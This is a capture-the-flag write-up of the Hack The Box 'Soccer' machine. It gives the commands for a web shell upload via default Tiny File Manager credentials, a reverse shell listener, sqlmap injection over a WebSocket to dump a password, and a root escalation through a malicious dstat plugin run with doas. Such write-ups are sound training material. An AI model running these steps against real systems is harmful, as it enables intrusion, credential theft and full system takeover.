# Soccer - HTB Write-up

## Overview
Soccer is an easy-difficulty Linux machine that involves exploiting a Tiny File Manager vulnerability to gain initial access, followed by SQL injection through a WebSocket connection to extract credentials, and finally privilege escalation via a custom dstat plugin.

## Reconnaissance

### Port Scanning
First, let's enumerate open ports on the target:

```bash
# Full port scan
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

# Service enumeration on open ports
nmap -p$ports -sC -sV 10.10.11.194 -oN nmap

# UDP scan
sudo nmap 10.10.11.194 -sU -oN nmap_UDP
```

**Open ports:**
- 22/tcp - OpenSSH 8.2p1 Ubuntu
- 80/tcp - nginx 1.18.0
- 9091/tcp - xmltec-xmlmail?
- 68/udp - dhcpc (open|filtered)

Add the domain to `/etc/hosts`:
```
echo "10.10.11.194 soccer.htb" | sudo tee -a /etc/hosts
```

## Web Enumeration
Main page:

### Directory Busting
Using feroxbuster to discover hidden directories:

```bash
feroxbuster -u http://soccer.htb/ -o feroxbuster
```

This revealed an interesting endpoint: `http://soccer.htb/tiny/`

### Tiny File Manager
Accessing the `/tiny/` directory presents a login page for Tiny File Manager, a PHP-based application.

**Default credentials tested:** `admin:admin@123` - Success!

![Tiny File Manager Login](attachment:b9338dd1-17c2-49ae-b796-f31d1f37c93f:image.png)

## Initial Foothold

### Web Shell Upload
The application allows file uploads. We can upload a PHP web shell:

![Web Shell Upload](attachment:7f9da861-782b-4eed-826c-917f5644c0fe:image.png)

### Remote Code Execution
Accessing the uploaded shell confirms RCE:

![RCE Confirmation](attachment:f5cf199e-e8c2-4548-8790-7db8521f5a2d:image.png)

### Reverse Shell
Upload a reverse shell payload and set up a listener:

```bash
# Upload reverse-shell.php
# Set up listener
nc -lvnp 4444
```

![Reverse Shell Upload](attachment:ea921c5b-5319-4de8-8eb8-f2ddfd275644:image.png)
![Listener](attachment:4b7ecc06-844f-4bb6-8648-08d9e10589c8:image.png)

## Lateral Movement

### Discovering soc-player.soccer.htb
While exploring the filesystem, we discover another domain:

```bash
cat /etc/hosts
```
Output shows: `soc-player.soccer.htb`

Add it to `/etc/hosts`:
```
echo "10.10.11.194 soc-player.soccer.htb" | sudo tee -a /etc/hosts
```

### Web Application Analysis
The site `soc-player.soccer.htb` is a soccer-related application. Create an account:
- Email: `1@r.com`
- Username: `12345678`

### WebSocket Endpoint
During testing, we find an endpoint `/check` that creates a WebSocket connection to `ws://soc-player.soccer.htb:9091`

![WebSocket Check](attachment:0e9f28cf-474c-4a72-8e5c-971abc3aa801:image.png)

### SQL Injection via WebSocket
Testing reveals the WebSocket endpoint is vulnerable to SQL injection:

![SQL Injection Test](attachment:19311f73-1895-4eb7-8b44-e3c5e22fab6b:image.png)

## Database Exploitation with SQLMap

Use SQLMap to automate exploitation:

```bash
# Initial scan
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10

# Enumerate databases
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10 --dbs
```

![Database Enumeration](attachment:db791a9e-ff54-4100-a208-92de94ab2cb1:image.png)

**Databases found:**
- soccer_db

```bash
# Enumerate tables
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10 -D soccer_db --tables
```

![Tables](attachment:25a3bcd9-22b7-43cf-81b0-d14f55a7970a:image.png)

**Interesting table:** `accounts`

```bash
# Dump credentials
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --level 5 --risk 3 --batch --threads 10 -D soccer_db -T accounts --dump
```

![Credentials Dump](attachment:dc538783-89f1-42f9-89e4-4a95d760998b:image.png)

**Credentials obtained:**
- Username: player
- Password: PlayerOftheMatch2022

### SSH Access
Use these credentials to connect via SSH:

```bash
ssh player@10.10.11.194
# Password: PlayerOftheMatch2022
```

## Privilege Escalation

### System Enumeration
Transfer LinPEAS for automated enumeration:

```bash
# On attacker machine
scp /home/kali/Documents/Scripts/linpeas.sh player@10.129.4.124:/home/player

# On target
chmod +x linpeas.sh
./linpeas.sh
```

**System Information:**
- OS: Ubuntu 20.04 (Linux 5.4.0-135-generic)
- User: player (uid=1001)
- Hostname: soccer
- Sudo version: 1.8.31

### SUID and doas Discovery
Checking for SUID binaries reveals an interesting binary:

```bash
find / -perm -4000 2>/dev/null
```

![SUID Binaries](attachment:6e1d0ff3-8d29-4ecd-87f0-aa93506ff697:image.png)

Notice `/usr/local/bin/doas` - similar to sudo but for BSD systems.

Check doas configuration:

```bash
find / -type f -name "doas.conf" 2>/dev/null
```

![doas.conf](attachment:7a2f0412-15c7-4f70-8d93-f30a791eda1a:image.png)

The configuration shows we can run `/usr/bin/dstat` as root without password:

![doas Permissions](attachment:a125af7a-0354-48a7-b3e4-09bedaa883a6:image.png)

### dstat Exploitation
dstat is a versatile resource statistics tool that supports plugins. We can create a custom plugin to gain root access.

Check writable directories:

![Writable Directories](attachment:5efaddde-50f8-46d6-a712-de832d9647ca:image.png)

List available plugins:

```bash
doas /usr/bin/dstat --list
```

![dstat Plugins](attachment:57b50050-746e-469b-9112-7b93c1827892:image.png)

Create a malicious plugin that executes a shell:

```bash
echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_exploit.py
```

Verify the plugin was created:

```bash
doas /usr/bin/dstat --list
```

![New Plugin](attachment:e55e6a6b-b266-4656-a19a-27ad30923e14:image.png)

Execute the plugin with doas to gain root shell:

```bash
doas /usr/bin/dstat --exploit
```

![Root Shell](attachment:root-shell.png)

## Conclusion
The Soccer box demonstrates several common vulnerabilities:
1. **Default credentials** in Tiny File Manager leading to initial access
2. **WebSocket SQL injection** for credential extraction
3. **doas misconfiguration** allowing privilege escalation through custom dstat plugins

This box emphasizes the importance of:
- Changing default credentials
- Properly validating WebSocket inputs
- Restricting doas/sudo configurations to only necessary commands
- Understanding that plugin-based systems can be abused for privilege escalation

**Flags:**
- User flag: `/home/player/user.txt`
- Root flag: `/root/root.txt`
